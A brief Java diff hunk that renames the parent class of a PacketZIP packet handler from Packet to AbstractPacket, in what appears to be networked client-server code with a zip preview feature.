@@ -7,7 +7,7 @@ import com.redpois0n.ui.frames.FramePreviewZip;
 import com.redpois0n.utils.IconUtils;
 
 
-public class PacketZIP extends Packet {
+public class PacketZIP extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
